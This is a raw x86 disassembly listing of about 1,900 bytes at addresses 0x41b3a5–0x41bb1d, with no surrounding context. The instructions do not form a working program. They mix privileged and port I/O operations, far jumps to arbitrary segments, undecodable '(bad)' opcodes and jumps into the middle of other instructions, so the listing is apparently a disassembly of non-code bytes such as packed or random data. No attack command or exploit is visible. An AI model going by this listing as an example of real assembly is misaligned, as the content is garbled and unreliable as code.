  41b3a5:	mov    ds:0xe5027e68,eax
  41b3aa:	mov    dh,bh
  41b3ac:	aad    0x30
  41b3ae:	and    edi,eax
  41b3b0:	test   DWORD PTR [edx+0x1e073172],eax
  41b3b6:	inc    ebp
  41b3b7:	outs   dx,BYTE PTR ds:[esi]
  41b3b8:	icebp  
  41b3b9:	xchg   ecx,ebx
  41b3bb:	and    al,0xdd
  41b3bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3be:	push   0xffffffa3
  41b3c0:	inc    ebx
  41b3c1:	xlat   BYTE PTR ds:[ebx]
  41b3c2:	push   edi
  41b3c3:	jmp    0x37d2:0x8789fee1
  41b3ca:	mov    bl,0x4b
  41b3cc:	mov    al,0xa6
  41b3ce:	add    eax,0x18c50a6a
  41b3d3:	or     DWORD PTR [eax],edx
  41b3d5:	push   edx
  41b3d6:	inc    edx
  41b3d7:	inc    ebp
  41b3d8:	sti    
  41b3d9:	fidiv  DWORD PTR [ebx-0x63]
  41b3dc:	fs jne 0x41b3f4
  41b3df:	pop    ds
  41b3e0:	ja     0x41b3c8
  41b3e2:	sahf   
  41b3e3:	jns    0x41b3ea
  41b3e5:	cmc    
  41b3e6:	das    
  41b3e7:	cli    
  41b3e8:	das    
  41b3e9:	scas   eax,DWORD PTR es:[edi]
  41b3ea:	out    dx,al
  41b3eb:	jb     0x41b3c1
  41b3ed:	mov    esp,0x483b6b86
  41b3f2:	and    eax,0x3e31e016
  41b3f7:	sbb    al,0x1d
  41b3fa:	hlt    
  41b3fb:	jno    0x41b465
  41b3fd:	pop    edi
  41b3fe:	inc    ebx
  41b3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b400:	cli    
  41b401:	sub    BYTE PTR [esi+0x8],cl
  41b404:	and    edi,DWORD PTR [esi+0x71]
  41b407:	xchg   edx,eax
  41b408:	test   BYTE PTR [eax+0x635cfe49],dl
  41b40e:	add    eax,0xee6f8072
  41b413:	ja     0x41b42a
  41b415:	dec    edi
  41b416:	jmp    0x816d:0xe19a0888
  41b41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b41e:	cwde   
  41b41f:	out    dx,al
  41b420:	mov    dl,0x65
  41b422:	sbb    dh,BYTE PTR [eax+0x18f1d3b9]
  41b428:	fptan  
  41b42a:	dec    edx
  41b42b:	enter  0x5ea0,0x7a
  41b42f:	out    dx,al
  41b430:	rcl    DWORD PTR [eax],0xc6
  41b433:	jmp    0x9a90:0xbaaef2f0
  41b43a:	shr    DWORD PTR [ebx-0x7abdd677],cl
  41b440:	mov    ch,0x12
  41b442:	push   esp
  41b443:	(bad)  
  41b444:	sti    
  41b445:	in     al,dx
  41b446:	iret   
  41b447:	push   ebx
  41b448:	loop   0x41b4b3
  41b44a:	dec    edx
  41b44b:	mov    cl,0x31
  41b44d:	jg     0x41b444
  41b44f:	xchg   esi,eax
  41b450:	loopne 0x41b4c6
  41b452:	popf   
  41b453:	cld    
  41b454:	call   0x851e:0xa36570b3
  41b45b:	xchg   edi,eax
  41b45c:	xchg   ebp,eax
  41b45d:	jle    0x41b463
  41b45f:	clc    
  41b460:	adc    bl,BYTE PTR [ebx-0x56]
  41b463:	mov    esp,0x10401f9d
  41b468:	into   
  41b469:	ins    DWORD PTR es:[edi],dx
  41b46a:	mov    al,0xd6
  41b46c:	stos   BYTE PTR es:[edi],al
  41b46d:	xchg   ebx,eax
  41b46e:	xchg   BYTE PTR [edi-0x65175480],dh
  41b474:	jp     0x41b426
  41b476:	xor    bh,BYTE PTR ds:0x9e1998db
  41b47c:	jmp    0x20ebbfe
  41b481:	push   es
  41b482:	ss aad 0xc
  41b485:	or     eax,0x69e5e9f2
  41b48a:	nop
  41b48b:	or     esp,edi
  41b48d:	stc    
  41b48e:	inc    eax
  41b48f:	or     ch,BYTE PTR [eax+0x751905f9]
  41b495:	cmp    DWORD PTR [edx-0x301a4767],esp
  41b49b:	and    bl,bl
  41b49d:	leave  
  41b49e:	sub    ah,dh
  41b4a0:	push   esp
  41b4a1:	jne    0x41b4cb
  41b4a3:	push   0xf522affc
  41b4a8:	mov    al,ds:0xcb63b79f
  41b4ae:	lods   eax,DWORD PTR ds:[esi]
  41b4af:	jmp    0x41b443
  41b4b1:	lock rcr BYTE PTR [edx+edi*2+0x16],1
  41b4b6:	xor    edx,edx
  41b4b8:	cwde   
  41b4b9:	test   edi,0x9f596608
  41b4bf:	pop    es
  41b4c0:	cmp    bl,BYTE PTR [eax]
  41b4c2:	xchg   esi,eax
  41b4c3:	pop    eax
  41b4c4:	ret    0xa81e
  41b4c7:	test   DWORD PTR [ebx-0x79b11947],eax
  41b4cd:	out    0x26,eax
  41b4cf:	out    0xaa,eax
  41b4d1:	daa    
  41b4d2:	ret    
  41b4d3:	(bad)  
  41b4d4:	mov    cx,0x1470
  41b4d8:	daa    
  41b4d9:	cld    
  41b4da:	repnz xor al,0x8a
  41b4dd:	xor    DWORD PTR ds:0x9d7f192,eax
  41b4e3:	mov    BYTE PTR [edx+0x10da769c],0xd0
  41b4ea:	push   eax
  41b4eb:	iret   
  41b4ec:	cs inc ecx
  41b4ee:	int3   
  41b4ef:	icebp  
  41b4f0:	pop    ebp
  41b4f1:	mov    al,ds:0xc617a77a
  41b4f6:	mov    ebp,0x9b87868e
  41b4fb:	mov    ch,0x8f
  41b4fd:	div    ah
  41b4ff:	xchg   edx,eax
  41b500:	adc    dl,BYTE PTR [edx+ecx*4+0x3b5cf470]
  41b507:	mov    esi,0x94e8a45
  41b50c:	bound  ecx,QWORD PTR [esi+eiz*2]
  41b50f:	xor    BYTE PTR [ebx+0x557e793b],ah
  41b515:	pop    ss
  41b516:	xchg   esi,eax
  41b517:	test   dl,ch
  41b519:	test   DWORD PTR [esi],esp
  41b51b:	stc    
  41b51c:	sub    BYTE PTR [ecx+edi*8],ch
  41b51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b521:	and    dl,BYTE PTR [esi]
  41b523:	call   eax
  41b525:	mov    cs:0xa1daba9b,al
  41b52b:	mul    DWORD PTR [edi+0x26]
  41b52e:	out    0x6b,eax
  41b530:	or     BYTE PTR [ebp+ebx*2+0x17d93010],bh
  41b537:	jl     0x41b557
  41b539:	mov    ds:0x52ac716f,al
  41b53e:	mov    bl,0x91
  41b540:	or     ch,BYTE PTR [ecx+0x16]
  41b543:	mov    cl,BYTE PTR [esi+0x495e19fb]
  41b549:	mov    esi,0xc2331d0
  41b54e:	std    
  41b54f:	xor    BYTE PTR [edi],ch
  41b551:	push   edx
  41b552:	sub    eax,0x21003a06
  41b557:	pop    ss
  41b558:	int    0xb6
  41b55a:	out    0x70,eax
  41b55c:	xchg   esi,eax
  41b55d:	stc    
  41b55e:	mov    al,ds:0x54a3a55f
  41b563:	jno    0x41b598
  41b565:	push   ebx
  41b566:	rol    cl,1
  41b568:	test   BYTE PTR ds:0xd868e83c,0x23
  41b56f:	push   ss
  41b570:	mov    ss,WORD PTR [eax+0x275fa41a]
  41b576:	fwait
  41b577:	aad    0x2f
  41b579:	cdq    
  41b57a:	into   
  41b57b:	pusha  
  41b57c:	push   esp
  41b57d:	pop    eax
  41b57e:	pushf  
  41b57f:	loopne 0x41b5d0
  41b581:	pop    ebp
  41b582:	cmp    al,ch
  41b584:	mov    al,ds:0x3cdcbd65
  41b589:	add    BYTE PTR [edi-0x25],al
  41b58c:	rdmsr  
  41b58e:	xchg   edx,eax
  41b58f:	scas   al,BYTE PTR es:[edi]
  41b590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b591:	outs   dx,BYTE PTR ds:[esi]
  41b592:	jge    0x41b54c
  41b594:	out    0xc1,eax
  41b596:	outs   dx,DWORD PTR ds:[esi]
  41b597:	rol    DWORD PTR [edi+0x77],1
  41b59a:	inc    esi
  41b59b:	sbb    eax,0x13237c87
  41b5a0:	and    eax,0x6bfc727e
  41b5a5:	jecxz  0x41b583
  41b5a7:	lods   al,BYTE PTR ds:[esi]
  41b5a8:	pusha  
  41b5a9:	sbb    ch,ch
  41b5ab:	dec    esp
  41b5ac:	push   ds
  41b5ad:	popf   
  41b5ae:	mov    ebx,0x9e1a09be
  41b5b3:	xchg   ebp,eax
  41b5b4:	pop    ds
  41b5b5:	into   
  41b5b6:	test   eax,0xf7f8436a
  41b5bb:	and    ch,bh
  41b5bd:	push   0xffffffdf
  41b5bf:	leave  
  41b5c0:	add    eax,0xb16df0b9
  41b5c5:	add    DWORD PTR [eax],ebp
  41b5c7:	ror    BYTE PTR [edi],1
  41b5c9:	out    0xac,eax
  41b5cb:	adc    al,0x17
  41b5cd:	jp     0x41b5f2
  41b5cf:	or     ebp,DWORD PTR ds:0x7ee1ba59
  41b5d5:	add    ax,bx
  41b5d8:	out    0xf0,eax
  41b5da:	mov    esp,DWORD PTR [edi-0x26a3f02d]
  41b5e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e1:	pop    esp
  41b5e2:	in     al,0xdb
  41b5e4:	das    
  41b5e5:	scas   eax,DWORD PTR es:[edi]
  41b5e6:	mov    ah,0x48
  41b5e8:	jae    0x41b5ab
  41b5ea:	fstp   DWORD PTR [edx]
  41b5ec:	rol    BYTE PTR [edi+0x398b35ed],0xcf
  41b5f3:	dec    ebp
  41b5f4:	stc    
  41b5f5:	and    DWORD PTR [ebx],0xe
  41b5f8:	jecxz  0x41b5a6
  41b5fa:	pop    ecx
  41b5fb:	pop    esi
  41b5fc:	xor    BYTE PTR [edx+0x2dd3b412],al
  41b602:	and    BYTE PTR [ecx],0x2c
  41b605:	pop    es
  41b606:	sub    eax,0x190752c3
  41b60b:	bnd jnp 0x41b65d
  41b60e:	sub    ah,bh
  41b610:	sti    
  41b611:	gs enter 0x3892,0xd
  41b616:	and    eax,0xb7c9725b
  41b61b:	pop    edx
  41b61c:	xchg   ecx,eax
  41b61d:	add    BYTE PTR [edx+0x1c6a5cc1],ch
  41b623:	jmp    0x28ce:0xe1be887c
  41b62a:	sahf   
  41b62b:	sahf   
  41b62c:	mov    bh,0xa9
  41b62e:	mov    gs,edx
  41b630:	dec    DWORD PTR [edx+0x1b]
  41b633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b634:	ret    0xac35
  41b637:	xchg   edx,eax
  41b638:	pop    ebp
  41b639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b63a:	pusha  
  41b63b:	call   0xed50:0xa7f64c43
  41b642:	das    
  41b643:	fcomi  st,st(7)
  41b645:	popf   
  41b646:	in     al,dx
  41b647:	push   es
  41b648:	cs cmp eax,0x6323df2d
  41b64e:	imul   ebx,DWORD PTR [ebp+ecx*2-0x7fc67fc5],0xfffffff0
  41b656:	imul   esp,ebp,0xffffff95
  41b659:	or     BYTE PTR ds:0x961770c0,0xb6
  41b660:	push   0x65
  41b662:	(bad)  
  41b663:	dec    ebp
  41b664:	inc    esi
  41b665:	pop    ss
  41b666:	sbb    al,0xdb
  41b668:	xchg   esi,eax
  41b669:	stos   BYTE PTR es:[edi],al
  41b66a:	rcl    eax,cl
  41b66c:	and    BYTE PTR [eax],0x1b
  41b66f:	push   ebx
  41b670:	je     0x41b68b
  41b672:	retf   0x1efd
  41b675:	mov    edx,DWORD PTR [ebp+0x31bbefb3]
  41b67b:	nop
  41b67c:	pop    es
  41b67d:	pop    edx
  41b67e:	dec    edx
  41b67f:	bound  esi,QWORD PTR [edi+eax*8-0x2c672215]
  41b686:	push   0x43f3db76
  41b68b:	push   edx
  41b68c:	xchg   ebp,eax
  41b68d:	mov    eax,ds:0x88810bbc
  41b692:	imul   edi,DWORD PTR [eax],0xffffffbd
  41b695:	stos   DWORD PTR es:[edi],eax
  41b696:	aaa    
  41b697:	addr16 out 0xea,eax
  41b69a:	(bad)  
  41b69b:	cmp    BYTE PTR [edi-0x3c],bl
  41b69e:	mov    dh,0xf
  41b6a0:	js     0x41b69b
  41b6a2:	adc    DWORD PTR [ecx],ebx
  41b6a4:	pusha  
  41b6a5:	icebp  
  41b6a6:	cdq    
  41b6a7:	call   0xb792b583
  41b6ac:	mov    edx,DWORD PTR [ebp-0x7fc5bb08]
  41b6b2:	fwait
  41b6b3:	daa    
  41b6b4:	aaa    
  41b6b5:	prefetch (bad)
  41b6b6:	or     eax,0x2a3fd4e3
  41b6bb:	pop    esi
  41b6bc:	test   DWORD PTR [esp+ebx*1-0x46e389d0],esi
  41b6c3:	das    
  41b6c4:	lock stc 
  41b6c6:	jbe    0x41b649
  41b6c8:	(bad)  
  41b6c9:	loopne 0x41b6e7
  41b6cb:	daa    
  41b6cc:	adc    cl,BYTE PTR [edx+0x208b2abf]
  41b6d2:	add    ah,BYTE PTR [eax+0x69]
  41b6d5:	jle    0x41b6bb
  41b6d7:	adc    al,0x39
  41b6d9:	mov    DWORD PTR [edx-0x21e8aad4],ebx
  41b6df:	call   0x7096:0x89b798e4
  41b6e6:	or     edx,DWORD PTR [edi]
  41b6e8:	jge    0x41b6d5
  41b6ea:	mov    dl,0x73
  41b6ec:	stos   DWORD PTR es:[edi],eax
  41b6ed:	add    edx,ebp
  41b6ef:	scas   eax,DWORD PTR es:[edi]
  41b6f0:	xchg   DWORD PTR [ebx+0xb],edi
  41b6f3:	loope  0x41b719
  41b6f5:	ja     0x41b6bc
  41b6f7:	mov    esp,0x9120b95c
  41b6fc:	xor    al,0x2e
  41b6fe:	(bad)  
  41b6ff:	jp     0x41b74f
  41b701:	rcl    DWORD PTR [edx-0x199e9bb7],1
  41b707:	dec    ecx
  41b708:	(bad)  
  41b709:	xor    BYTE PTR [ecx-0x54],bh
  41b70c:	outs   dx,BYTE PTR ds:[esi]
  41b70d:	lds    edi,FWORD PTR [ebx+0x61]
  41b710:	pop    es
  41b711:	dec    edi
  41b712:	mov    al,ds:0x6ea6703e
  41b717:	mov    dh,0xfb
  41b719:	fiadd  DWORD PTR [edi]
  41b71b:	and    eax,0x583094bc
  41b720:	ins    BYTE PTR es:[edi],dx
  41b721:	or     al,0x3d
  41b723:	clc    
  41b724:	aad    0xb0
  41b726:	fstp   QWORD PTR [esi-0x7d]
  41b729:	add    eax,0xaca1d12b
  41b72e:	and    bl,BYTE PTR [ebp+0x3fd999cf]
  41b734:	mov    esi,0xdfd6ad43
  41b739:	ret    0xf407
  41b73c:	in     eax,0xab
  41b73e:	sbb    ch,ch
  41b740:	push   ebp
  41b741:	or     cl,BYTE PTR [edx+0x47]
  41b744:	sbb    ebx,eax
  41b746:	adc    dl,BYTE PTR [esi+ebp*4-0x7183b158]
  41b74d:	into   
  41b74e:	or     ecx,DWORD PTR [eax+0x270aa3e2]
  41b754:	adc    BYTE PTR [edi+0x10],0x76
  41b758:	pop    ecx
  41b759:	cld    
  41b75a:	push   ss
  41b75b:	pop    eax
  41b75c:	je     0x41b725
  41b75e:	push   ebp
  41b75f:	fst    QWORD PTR [eiz*4+0x6fe283ff]
  41b766:	or     ecx,edi
  41b768:	in     eax,0x75
  41b76a:	jge    0x41b7c6
  41b76c:	or     BYTE PTR [ebp-0x308254e9],cl
  41b772:	enter  0xad2a,0x8e
  41b776:	mov    ds:0xbd0343a,eax
  41b77b:	sbb    BYTE PTR [edi-0x65],bh
  41b77e:	mov    dh,dl
  41b780:	cmp    dl,BYTE PTR [ebp-0x54]
  41b783:	stos   BYTE PTR es:[edi],al
  41b784:	mov    bl,0x5c
  41b786:	pop    ecx
  41b787:	mov    al,0x4
  41b789:	nop
  41b78a:	push   edi
  41b78b:	jbe    0x41b7ea
  41b78d:	inc    esi
  41b78e:	sub    eax,0xd45a1505
  41b793:	jnp    0x41b7c5
  41b795:	mov    al,0xdf
  41b797:	shl    DWORD PTR [eax+0x3e212e17],cl
  41b79d:	arpl   WORD PTR [edi],cx
  41b79f:	cmp    WORD PTR [edx-0x4],dx
  41b7a3:	retf   
  41b7a4:	leave  
  41b7a5:	dec    edi
  41b7a6:	cmp    BYTE PTR [ebx],0x65
  41b7a9:	xchg   edi,eax
  41b7aa:	inc    ecx
  41b7ab:	mov    edx,DWORD PTR [ebx+0xe]
  41b7ae:	retf   0xd2e9
  41b7b1:	mov    DWORD PTR ds:0x372f707f,ebp
  41b7b7:	xchg   ebp,eax
  41b7b8:	out    dx,eax
  41b7b9:	lods   eax,DWORD PTR ds:[esi]
  41b7ba:	pop    eax
  41b7bb:	test   BYTE PTR [eax-0x60f38a15],bl
  41b7c1:	jmp    0x9431:0x87974a27
  41b7c8:	lea    esp,[ebp-0x63]
  41b7cb:	ret    
  41b7cc:	push   0xebb956fa
  41b7d1:	sti    
  41b7d2:	pop    esi
  41b7d3:	and    BYTE PTR [eax-0xaa5bf50],ch
  41b7d9:	jne    0x41b784
  41b7db:	aas    
  41b7dc:	cld    
  41b7dd:	or     cl,BYTE PTR [esi-0x1d]
  41b7e0:	ret    0x1725
  41b7e3:	push   0x6c389001
  41b7e8:	test   eax,0x506a990a
  41b7ed:	into   
  41b7ee:	pop    ss
  41b7ef:	sahf   
  41b7f0:	pushf  
  41b7f1:	adc    BYTE PTR [ecx],ch
  41b7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f4:	xchg   ebp,eax
  41b7f5:	mov    bl,cl
  41b7f7:	xchg   edi,eax
  41b7f8:	xchg   ecx,eax
  41b7f9:	mov    dl,0x38
  41b7fb:	nop
  41b7fc:	test   BYTE PTR [ecx-0x74],bh
  41b7ff:	push   0x2c
  41b801:	and    eax,0xd14c6dc2
  41b806:	js     0x41b825
  41b808:	jecxz  0x41b7ce
  41b80a:	pop    esp
  41b80b:	jmp    0xc2e9ae92
  41b810:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41b812:	inc    eax
  41b813:	rcr    BYTE PTR [esi+0x3d],1
  41b816:	or     al,0x58
  41b818:	sahf   
  41b819:	popa   
  41b81a:	aam    0x6b
  41b81c:	mov    ds:0x826e5b84,eax
  41b821:	mov    edx,DWORD PTR [ebp-0x2a]
  41b824:	and    eax,0x1484d994
  41b829:	cmp    DWORD PTR [edi-0x65af092a],esi
  41b82f:	fs pop es
  41b831:	xchg   esp,eax
  41b832:	dec    eax
  41b833:	pop    ss
  41b834:	dec    edx
  41b835:	in     al,0x5d
  41b837:	push   es
  41b838:	rcr    BYTE PTR [eax],0xc
  41b83b:	imul   ecx,DWORD PTR ds:0x2015b16c,0xa2b2a060
  41b845:	lahf   
  41b846:	ja     0x41b8a8
  41b848:	pop    es
  41b849:	loope  0x41b8ad
  41b84b:	js     0x41b805
  41b84d:	sub    edi,edi
  41b84f:	sbb    al,0x50
  41b851:	out    dx,al
  41b852:	mov    WORD PTR [ecx+0x43],ds
  41b855:	sbb    al,0xdb
  41b857:	scas   al,BYTE PTR es:[edi]
  41b858:	cmp    DWORD PTR [edi-0x36],ebx
  41b85b:	cmc    
  41b85c:	xor    eax,0x2c51d93f
  41b861:	imul   edi,esp,0x45ec883b
  41b867:	xchg   DWORD PTR [eax-0x29],esp
  41b86a:	pop    esi
  41b86b:	xor    eax,0x27f6d77
  41b870:	pop    edi
  41b871:	ins    DWORD PTR es:[edi],dx
  41b872:	dec    ecx
  41b873:	fild   WORD PTR [esi]
  41b875:	pop    eax
  41b876:	not    eax
  41b878:	adc    al,BYTE PTR [ebp+0x3a]
  41b87b:	repz (bad) 
  41b87d:	repnz adc DWORD PTR [ecx-0x3c3a655c],edx
  41b884:	sahf   
  41b885:	test   WORD PTR [esi-0x74165419],sp
  41b88c:	adc    ebp,DWORD PTR [edx-0x56]
  41b88f:	mov    si,0x53a7
  41b893:	sbb    esp,DWORD PTR [edx-0x5f]
  41b896:	pop    ebp
  41b897:	fild   QWORD PTR [ecx+edx*8]
  41b89a:	jl     0x41b8b4
  41b89c:	shr    BYTE PTR [edx+0x57f2006a],cl
  41b8a2:	lea    eax,[esi+edi*1]
  41b8a5:	call   0x9f6b37e0
  41b8aa:	push   ds
  41b8ab:	mov    edx,0xb34ade5c
  41b8b0:	hlt    
  41b8b1:	lahf   
  41b8b2:	pop    ds
  41b8b3:	fsub   QWORD PTR [edi+edi*2-0x2dd02e65]
  41b8ba:	sub    al,0x8c
  41b8bc:	nop
  41b8bd:	cdq    
  41b8be:	push   esp
  41b8bf:	jbe    0x41b8b8
  41b8c1:	or     eax,0xf0376075
  41b8c6:	cmp    bh,BYTE PTR [ebx]
  41b8c8:	xchg   DWORD PTR es:[edi+0x4e5c86b7],ebp
  41b8cf:	hlt    
  41b8d0:	into   
  41b8d1:	sub    al,0xa4
  41b8d3:	clc    
  41b8d4:	les    ecx,FWORD PTR [edi-0x5]
  41b8d7:	push   ecx
  41b8d8:	inc    ebx
  41b8d9:	cli    
  41b8da:	stc    
  41b8db:	xchg   ecx,eax
  41b8dc:	int    0xb8
  41b8de:	mov    eax,ds:0x13d9f1ee
  41b8e3:	loopne 0x41b8c9
  41b8e5:	jmp    0x340b6cf5
  41b8ea:	fs (bad) 
  41b8ec:	cmp    bl,BYTE PTR [ebx+0x71]
  41b8ef:	loope  0x41b891
  41b8f1:	pushf  
  41b8f2:	xor    eax,0xd997b1f8
  41b8f7:	push   ebx
  41b8f8:	aaa    
  41b8f9:	in     eax,dx
  41b8fa:	imul   ebx,DWORD PTR [edx],0xff7d98c0
  41b900:	pop    edx
  41b901:	push   ss
  41b902:	das    
  41b903:	mov    ah,0x81
  41b905:	xchg   edx,eax
  41b906:	sub    DWORD PTR [ecx+0x1394d769],ecx
  41b90c:	sub    DWORD PTR [esi-0x18],0x6
  41b910:	pop    esi
  41b911:	add    eax,0xa287c71c
  41b916:	adc    dl,bh
  41b918:	adc    bl,BYTE PTR [ebx+0x4e]
  41b91b:	das    
  41b91c:	and    esp,eax
  41b91e:	dec    ebp
  41b91f:	lock rcl edi,1
  41b922:	pop    ebx
  41b923:	dec    edx
  41b924:	add    eax,0xb7cc6dd5
  41b929:	in     al,0x33
  41b92b:	fnstenv [ebp*8+0x54b4186b]
  41b932:	retf   
  41b933:	shr    ch,1
  41b935:	repz jg 0x41b934
  41b938:	adc    eax,0x33600742
  41b93d:	js     0x41b9ae
  41b93f:	mov    dl,BYTE PTR [edi-0x6c]
  41b942:	or     esp,DWORD PTR [edx-0x7815d31d]
  41b948:	hlt    
  41b949:	push   0xffffff97
  41b94b:	push   ebp
  41b94c:	in     eax,dx
  41b94d:	loopne 0x41b960
  41b94f:	gs xchg esi,ebx
  41b952:	mov    edx,0xab17e7b5
  41b957:	add    BYTE PTR fs:[si],ah
  41b95b:	push   0x69e141ec
  41b960:	xchg   ebx,eax
  41b961:	push   eax
  41b962:	imul   edi,DWORD PTR [eax+0x2304590c],0x3a
  41b969:	sbb    ah,BYTE PTR [ecx+0x3454364f]
  41b96f:	mov    cs,WORD PTR [ebp-0x3628e9ed]
  41b975:	mov    eax,0xb91094dd
  41b97a:	aam    0x72
  41b97c:	sahf   
  41b97d:	in     al,0x25
  41b97f:	stc    
  41b980:	es stos BYTE PTR es:[edi],al
  41b982:	push   ebp
  41b983:	xchg   edx,eax
  41b984:	lods   eax,DWORD PTR ds:[esi]
  41b985:	mov    al,0xc8
  41b987:	repz sbb ah,BYTE PTR [esi+0xd]
  41b98b:	in     al,dx
  41b98c:	imul   edx,DWORD PTR [edi],0xfffffff7
  41b98f:	add    bh,BYTE PTR [ebx+0x636bc27b]
  41b995:	rol    BYTE PTR [edi],1
  41b997:	pop    ebx
  41b998:	sbb    BYTE PTR [ecx+0x35],ch
  41b99b:	mov    cl,0xc2
  41b99d:	adc    BYTE PTR [esi-0x33425d7a],cl
  41b9a3:	test   eax,0x5f4d7fc2
  41b9a8:	dec    ebx
  41b9a9:	clc    
  41b9aa:	pop    ds
  41b9ab:	(bad)  
  41b9ac:	dec    esi
  41b9ad:	stc    
  41b9ae:	lods   al,BYTE PTR ds:[esi]
  41b9af:	jmp    0x41b9b2
  41b9b1:	jl     0x41b9b6
  41b9b3:	xlat   BYTE PTR ds:[ebx]
  41b9b4:	cmp    al,0x58
  41b9b6:	cmc    
  41b9b7:	test   eax,0xa615a6e9
  41b9bc:	inc    eax
  41b9bd:	pop    edi
  41b9be:	pop    ecx
  41b9bf:	into   
  41b9c0:	das    
  41b9c1:	inc    ebp
  41b9c2:	or     BYTE PTR [eax-0x4484eee3],0x3e
  41b9c9:	data16 clc 
  41b9cb:	xlat   BYTE PTR ds:[ebx]
  41b9cc:	mov    ebp,DWORD PTR [ebx-0x7e]
  41b9cf:	arpl   si,si
  41b9d1:	sub    DWORD PTR [ebp+0x687e23cd],0xfbc51a7a
  41b9db:	scas   eax,DWORD PTR es:[edi]
  41b9dc:	pop    ss
  41b9dd:	or     esi,DWORD PTR ds:0xb654fbd
  41b9e3:	out    0x4d,eax
  41b9e5:	call   FWORD PTR [ebp+0x5a35ca24]
  41b9eb:	(bad)
  41b9ee:	push   0xad558f7f
  41b9f3:	(bad)  
  41b9f4:	dec    edi
  41b9f5:	gs retf 0x609f
  41b9f9:	retf   
  41b9fa:	sar    BYTE PTR [ecx+0x1ef4925f],1
  41ba00:	adc    al,0xb5
  41ba02:	out    dx,al
  41ba03:	sbb    esi,ebx
  41ba05:	ret    
  41ba06:	(bad)  
  41ba07:	xlat   BYTE PTR ds:[ebx]
  41ba08:	mov    bh,0x5f
  41ba0a:	xor    ah,BYTE PTR [edx+0x64]
  41ba0d:	xchg   edx,edx
  41ba0f:	cmp    al,0x94
  41ba11:	inc    edi
  41ba12:	cmp    BYTE PTR [ebp-0x79],al
  41ba15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba16:	sub    eax,0x6682b83f
  41ba1b:	call   0x9fd9affb
  41ba20:	push   DWORD PTR [si]
  41ba23:	and    BYTE PTR [ebp-0x57],cl
  41ba26:	mov    ebp,0x45d247fe
  41ba2b:	mov    ah,0x83
  41ba2d:	inc    esi
  41ba2e:	imul   ebx,ebp,0x57
  41ba31:	mov    eax,0x6c20f193
  41ba36:	popa   
  41ba37:	adc    dh,cl
  41ba39:	lahf   
  41ba3a:	sub    eax,0x8426a73a
  41ba3f:	pop    es
  41ba40:	sti    
  41ba41:	mov    al,0x1f
  41ba43:	adc    WORD PTR [ecx+0x30],si
  41ba47:	mov    edx,0xe4ca1a2d
  41ba4c:	call   0x99f92379
  41ba51:	cmp    BYTE PTR [ecx],dh
  41ba53:	rcl    BYTE PTR [esi],0x58
  41ba56:	jnp    0x41ba4c
  41ba58:	adc    eax,0x766caaba
  41ba5d:	jp     0x41bab8
  41ba5f:	add    BYTE PTR [ebx+0x347469c3],bh
  41ba65:	fwait
  41ba66:	jns    0x41ba27
  41ba68:	mov    dh,0xbc
  41ba6a:	add    eax,0x127a4821
  41ba6f:	jae    0x41ba25
  41ba71:	scas   eax,DWORD PTR es:[edi]
  41ba72:	adc    BYTE PTR [esi],al
  41ba74:	cwde   
  41ba75:	stc    
  41ba76:	mov    esp,0x5722bf3e
  41ba7b:	mov    ds:0x6ea202f9,al
  41ba80:	jp     0x41ba57
  41ba82:	push   cs
  41ba83:	mov    al,0x25
  41ba85:	adc    DWORD PTR [ecx],ebx
  41ba87:	inc    ebp
  41ba88:	icebp  
  41ba89:	stc    
  41ba8a:	int3   
  41ba8b:	adc    BYTE PTR [edi+edx*2],ah
  41ba8e:	pop    ds
  41ba8f:	sub    al,BYTE PTR es:[eax]
  41ba92:	sub    ebx,DWORD PTR [esi-0x50e8dbd]
  41ba98:	ja     0x41bb0c
  41ba9a:	dec    ecx
  41ba9b:	xchg   ecx,eax
  41ba9c:	inc    esp
  41ba9d:	or     BYTE PTR fs:[ecx-0x4ded1b38],0x70
  41baa5:	jo     0x41bad4
  41baa7:	adc    al,0x1f
  41baa9:	pop    esi
  41baaa:	sub    DWORD PTR [edi],ecx
  41baac:	shr    BYTE PTR [bp-0x3ff2],0x68
  41bab2:	aas    
  41bab3:	(bad)  
  41bab4:	shl    BYTE PTR [ebp-0x77],cl
  41bab7:	(bad)
  41baba:	dec    ebx
  41babb:	sub    DWORD PTR ds:0xb8caaea5,ebp
  41bac1:	adc    eax,0x41e0eab9
  41bac6:	sub    al,0x4a
  41bac8:	pop    ss
  41bac9:	adc    al,0x9d
  41bacc:	pop    ebx
  41bacd:	adc    bl,ah
  41bacf:	ins    DWORD PTR es:[edi],dx
  41bad0:	and    al,0xe1
  41bad2:	into   
  41bad3:	loop   0x41baac
  41bad5:	mov    ah,0xb4
  41bad7:	es push edi
  41bad9:	in     eax,dx
  41bada:	fisttp DWORD PTR [edi+0x43]
  41badd:	out    dx,eax
  41bade:	inc    ebx
  41badf:	mov    gs,esi
  41bae1:	mov    dl,0x0
  41bae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bae5:	inc    DWORD PTR [edi+ebp*1-0x5813ba7c]
  41baec:	inc    esi
  41baee:	loope  0x41bad1
  41baf0:	in     eax,0xbe
  41baf2:	inc    edx
  41baf3:	jmp    0x41bae3
  41baf5:	adc    eax,0x64938223
  41bafa:	sbb    BYTE PTR [ecx],bh
  41bafc:	adc    eax,ebp
  41bafe:	stc    
  41baff:	loope  0x41bb69
  41bb01:	xchg   edx,eax
  41bb02:	mov    al,0xda
  41bb04:	inc    eax
  41bb05:	jo     0x41bb0f
  41bb07:	mov    edx,0x753e0d2
  41bb0c:	xchg   edx,eax
  41bb0d:	xchg   BYTE PTR [ebx-0x69],bh
  41bb10:	loop   0x41bb49
  41bb12:	pop    ecx
  41bb13:	pop    edi
  41bb14:	mov    ebp,0x8723aab6
  41bb19:	shr    bl,1
  41bb1b:	jmp    0x41bb74
  41bb1d:	sbb    edx,esi
